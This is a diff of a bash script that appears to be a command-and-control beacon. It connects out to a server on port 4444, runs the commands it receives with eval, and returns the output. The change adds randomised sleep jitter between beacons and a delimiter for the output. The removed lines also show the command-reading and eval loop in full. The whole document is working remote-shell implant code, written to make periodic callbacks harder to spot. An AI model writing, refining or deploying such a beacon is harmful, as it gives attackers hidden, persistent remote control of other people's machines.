@@ -1,8 +1,10 @@
 #!/bin/bash
 
-# Server IP and port
+# Parameters
 SERVER_IP="192.168.108.15"
 SERVER_PORT=4444
+DELAY=10
+JITTER=2
 
 # Beacon to communicate with Agent Server
 while true; do
@@ -14,20 +16,16 @@ while true; do
                 wait
                 echo "$output"
                 echo "$output" >&5
+                echo "ac2delim" >&5
+
+                # Close socket
+                exec 5>&-; exec 5<&-
         done
 
-        command=$(cat <&5)
-        echo "Command: $command"
-        if [[ "command" == "exit" ]]; then
-                exit
-        fi
-
-        # Execute command and send back output
-        output=$(eval "$command" 2>&1)
-        echo "$output" >&5
-
-        # Close socket
-        exec 5>&-; exec 5<&-
-
-        sleep 10
+        # Sleep for DELAY +- JITTER
+        lower=$(( $DELAY - $JITTER ))
+        upper=$(( $DELAY + $JITTER ))
+        sleep_time=$(( RANDOM % ($upper - $lower + 1) + $lower ))
+        echo "Sleeping for $sleep_time"
+        sleep $sleep_time
 done
